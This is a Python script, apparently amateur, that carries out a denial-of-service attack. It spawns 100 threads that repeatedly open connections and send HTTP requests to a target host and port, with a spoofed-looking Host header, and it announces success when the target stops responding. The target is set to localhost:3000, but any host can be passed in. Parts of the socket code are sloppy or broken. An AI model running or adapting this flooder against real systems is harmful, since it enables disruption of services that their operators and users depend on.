import socket, threading, time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# TODO
host = "localhost"
port = 3000
fake_ip = '182.21.20.32'
default_port = 80

attack_num = 0
failed_requests = 0

def sendRequest():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (fake_ip, port))
        s.close()
        return True
    except ConnectionRefusedError:
        print("Connection refused")
        return False

def checkFailedRequests():
    while True:
        time.sleep(1)
        global failed_requests
        if failed_requests > 10:
            print(str(failed_requests) + " requested failed")
            break

    try:
        print("Let's try again if page works...")
        sendRequest()
    
    except TimeoutError:
        print("Connection failed")
        time.sleep(1)
        print("Attacked succeeded!")


def attack():
    while True:
        try:
            sendRequest()
            global attack_num
            attack_num += 1
            print("Attacks: " + str(attack_num)) 
        except BrokenPipeError:
            print("BrokenPipeError")    
        except TimeoutError:
            global failed_requests 
            failed_requests += 1
            break

def dosAtack(target, target_port):
    global host 
    host = target
    global port 
    port = target_port if target_port is not None else default_port
    print("DOS attack host:" + host + ", port:" + str(port))
    
    if sendRequest() == False:
        print("The web page is probably not working")
        quit()

    for i in range(100):
        try:
            thread = threading.Thread(target=attack)
            thread.start()
        except BrokenPipeError:
            print(str(i) + " thread broken")

    checkThread = threading.Thread(target=checkFailedRequests)
    checkThread.start()

    # TODO - return an answear

dosAtack("localhost", 3000)

